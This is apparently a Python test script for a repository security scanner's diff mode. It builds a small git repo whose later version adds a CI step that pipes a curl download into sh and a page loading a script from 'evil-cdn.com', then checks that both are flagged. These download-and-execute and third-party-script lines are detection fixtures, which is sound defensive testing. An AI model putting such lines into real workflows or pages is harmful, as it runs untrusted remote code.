#!/usr/bin/env python3
"""U18 version review: added curl|sh + third-party host appear once, unchanged refs are empty, renames move."""
import json
import subprocess
import sys
import tempfile
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
FIXTURE = ROOT / "tests" / "fixtures" / "control-clean"
FLAGS = ["--no-docker", "--no-osv", "--no-trust", "--no-color"]
fail = 0


def check(name, ok, detail=""):
    global fail
    print(("PASS " if ok else "FAIL ") + name + (f" — {detail}" if detail and not ok else ""))
    if not ok:
        fail = 1


def git(repo, *args):
    return subprocess.run(["git", *args], cwd=repo, capture_output=True, text=True, check=True)


def build_repo(td):
    repo = td / "repo"
    repo.mkdir()
    for path in FIXTURE.rglob("*"):
        if path.is_file():
            target = repo / path.relative_to(FIXTURE)
            target.parent.mkdir(parents=True, exist_ok=True)
            target.write_bytes(path.read_bytes())
    git(repo, "init", "-q")
    git(repo, "config", "user.name", "t")
    git(repo, "config", "user.email", "t@example.invalid")
    git(repo, "add", "-A")
    git(repo, "commit", "-qm", "v1")
    git(repo, "tag", "-a", "v1", "-m", "v1")
    (repo / ".github" / "workflows").mkdir(parents=True, exist_ok=True)
    (repo / ".github" / "workflows" / "ci.yml").write_text(
        "name: ci\non: [push]\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n"
        "      - run: curl -fsSL https://get.example.invalid/setup.sh | sh\n", encoding="utf-8")
    (repo / "web").mkdir()
    (repo / "web" / "index.html").write_text(
        '<!doctype html>\n<html><body><script src="https://evil-cdn.com/app.js"></script></body></html>\n',
        encoding="utf-8")
    git(repo, "add", "-A")
    git(repo, "commit", "-qm", "v2")
    git(repo, "tag", "-a", "v2", "-m", "v2")
    git(repo, "mv", "web/index.html", "web/page.html")
    git(repo, "add", "-A")
    git(repo, "commit", "-qm", "v3")
    git(repo, "tag", "-a", "v3", "-m", "v3")
    return f"file://{repo}"


def diff(url, old, new, *extra, json_out):
    r = subprocess.run([sys.executable, "repobeagle.py", "diff", f"{url}@{old}", f"{url}@{new}",
                        *FLAGS, *extra, "--json", str(json_out)],
                       cwd=ROOT, capture_output=True, text=True, timeout=900)
    doc = json.loads(Path(json_out).read_text(encoding="utf-8")) if Path(json_out).exists() else {}
    return r, doc


with tempfile.TemporaryDirectory() as td:
    td = Path(td)
    url = build_repo(td)
    r, doc = diff(url, "v1", "v2", "--min-severity", "high", json_out=td / "d12.json")
    titles = [f["title"] for f in doc.get("added") or []]
    check("an added curl|sh is a gated addition exactly once",
          r.returncode == 1 and sum(t.startswith("gha-curl-pipe-shell") for t in titles) == 1
          and sum(t.startswith("Download-and-execute") for t in titles) == 1, str(titles))
    check("the new third-party host appears once as a finding and once as a capability",
          sum(t.startswith("third-party-script") for t in titles) == 1
          and sum(1 for e in (doc["capabilities"]["added"].get("network") or [])
                  if e["value"] == "evil-cdn.com") == 1,
          json.dumps(doc.get("capabilities", {}).get("added"))[:300])
    check("the JSON keeps both sides' metadata",
          doc["old"]["ref"] == "v1" and doc["new"]["ref"] == "v2"
          and doc["old"]["commit"] and doc["new"]["commit"] and doc["gate"]["added"] == 1,
          json.dumps({k: doc.get(k, {}).get("commit") for k in ("old", "new")}))
    check("the added finding names the exact line",
          any(f.get("file") == ".github/workflows/ci.yml" and f.get("line") == 7
              for f in doc.get("added") or []), str([(f.get("file"), f.get("line")) for f in doc.get("added") or []]))

    r, doc = diff(url, "v2", "v2", json_out=td / "same.json")
    check("unchanged refs are an empty diff and exit 0",
          r.returncode == 0 and not (doc.get("added") or doc.get("removed") or doc.get("changed") or doc.get("moved"))
          and "no changes between the refs" in r.stdout, (r.stdout or r.stderr)[-300:])

    r, doc = diff(url, "v2", "v3", "--min-severity", "high", json_out=td / "d23.json")
    check("a renamed file is a move, not an addition",
          r.returncode == 0 and len(doc.get("moved") or []) == 1 and not doc.get("added")
          and doc["moved"][0]["from"] == "web/index.html" and doc["moved"][0]["to"] == "web/page.html",
          json.dumps(doc.get("moved"))[:300])

    r = subprocess.run([sys.executable, "repobeagle.py", "diff", f"{url}@v1", f"{url}@v2", "--no-docker",
                        "--no-osv", "--no-trust", "--min-severity", "critical"],
                       cwd=ROOT, capture_output=True, text=True, timeout=900)
    check("the gate respects --min-severity", r.returncode == 0, (r.stdout or r.stderr)[-300:])

sys.exit(fail)
